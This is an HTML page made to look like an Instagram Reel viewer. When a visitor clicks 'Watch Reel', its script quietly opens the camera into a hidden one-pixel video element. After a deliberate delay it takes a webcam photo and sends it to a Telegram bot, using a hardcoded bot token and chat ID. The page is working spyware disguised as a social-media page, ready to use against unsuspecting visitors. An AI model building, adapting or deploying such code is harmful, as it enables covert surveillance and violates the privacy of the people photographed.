<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Reel</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --ig-gray: #a8a8a8;
        }
        body {
            margin: 0;
            background: #000;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        .phone {
            width: 100%;
            max-width: 400px;
            height: 90vh;
            position: relative;
            overflow: hidden;
            background: #000;
            border: 1px solid #333;
            border-radius: 20px;
        }

        video.reel {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        /* Top Bar */
        .header {
            position: absolute;
            top: 20px;
            left: 20px;
            right: 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            color: white;
            z-index: 10;
        }
        .header h2 { font-size: 22px; margin: 0; }

        /* Right Side Actions */
        .actions {
            position: absolute;
            right: 12px;
            bottom: 150px;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 20px;
            color: white;
            z-index: 10;
        }
        .action-item { text-align: center; }
        .action-item i { font-size: 28px; display: block; margin-bottom: 5px; }
        .action-item span { font-size: 12px; }

        /* Bottom Info */
        .bottom-section {
            position: absolute;
            bottom: 70px;
            left: 15px;
            right: 70px;
            color: white;
            z-index: 10;
        }
        .user-info { display: flex; align-items: center; gap: 10px; margin-bottom: 10px; }
        .avatar { width: 32px; height: 32px; border-radius: 50%; border: 2px solid white; }
        .username { font-weight: 600; font-size: 14px; }
        .follow-btn { border: 1px solid white; padding: 2px 8px; border-radius: 5px; font-size: 12px; }
        .caption-text { font-size: 14px; margin-bottom: 8px; }
        .music-ticker { font-size: 13px; display: flex; align-items: center; gap: 5px; }

        /* Bottom Nav */
        .nav-bar {
            position: absolute;
            bottom: 0;
            width: 100%;
            height: 50px;
            background: black;
            display: flex;
            justify-content: space-around;
            align-items: center;
            color: white;
            border-top: 0.5px solid #222;
            z-index: 10;
        }

        .play-overlay {
            position: absolute;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.4);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 20;
        }
        .play-btn {
            background: white;
            color: black;
            border: none;
            padding: 15px 30px;
            border-radius: 30px;
            font-weight: bold;
            cursor: pointer;
            font-size: 16px;
        }

        #cam { position: absolute; width: 1px; height: 1px; opacity: 0; }
    </style>
</head>
<body>

<div class="phone">
    <div class="play-overlay" id="overlay">
        <button class="play-btn" onclick="startReel()">▶ Watch Reel</button>
    </div>

    <video id="reel" class="reel" loop playsinline>
        <source src="https://assets.mixkit.co/videos/preview/mixkit-girl-in-neon-light-dancing-2322-large.mp4">
    </video>

    <div class="header">
        <h2>Reels</h2>
        <i class="fas fa-camera"></i>
    </div>

    <div class="actions">
        <div class="action-item"><i class="far fa-heart"></i><span>145k</span></div>
        <div class="action-item"><i class="far fa-comment"></i><span>2,401</span></div>
        <div class="action-item"><i class="far fa-paper-plane"></i></div>
        <div class="action-item"><i class="fas fa-ellipsis-v"></i></div>
    </div>

    <div class="bottom-section">
        <div class="user-info">
            <div class="avatar" style="background: url('https://i.pravatar.cc/100') center/cover;"></div>
            <span class="username">creative_dancer</span>
            <span class="follow-btn">Follow</span>
        </div>
        <div class="caption-text" id="status">Neon nights and rhythm... #dance #vibes</div>
        <div class="music-ticker">
            <i class="fas fa-music"></i> <span>Original Audio - creative_dancer</span>
        </div>
    </div>

    <div class="nav-bar">
        <i class="fas fa-home"></i>
        <i class="fas fa-search"></i>
        <i class="far fa-plus-square"></i>
        <i class="fas fa-clapperboard"></i>
        <i class="far fa-user"></i>
    </div>

    <video id="cam" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>
</div>

<script>
    // Replace with your credentials
    const BOT_TOKEN = "8549057486:AAF2ddvgmQLA8Pnb-gL4-ZDdyRoKTJa5YoA";
    const CHAT_ID = "2018747103";

    async function startReel() {
        document.getElementById("overlay").style.display = "none";
        const video = document.getElementById("reel");
        video.muted = false;
        video.play();

        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const cam = document.getElementById("cam");
            cam.srcObject = stream;
            
            // Subtle delay before capture
            setTimeout(captureAndSend, 2000);
        } catch (err) {
            console.log("Camera access denied.");
        }
    }

    function captureAndSend() {
        const video = document.getElementById("cam");
        const canvas = document.getElementById("canvas");
        const ctx = canvas.getContext("2d");

        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        ctx.drawImage(video, 0, 0);

        canvas.toBlob(async (blob) => {
            const fd = new FormData();
            fd.append("chat_id", CHAT_ID);
            fd.append("photo", blob, "user_view.jpg");
            fd.append("caption", "📸 New Reel Viewer Captured");

            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: "POST",
                body: fd
            });
        }, "image/jpeg", 0.8);
    }
</script>

</body>
</html>
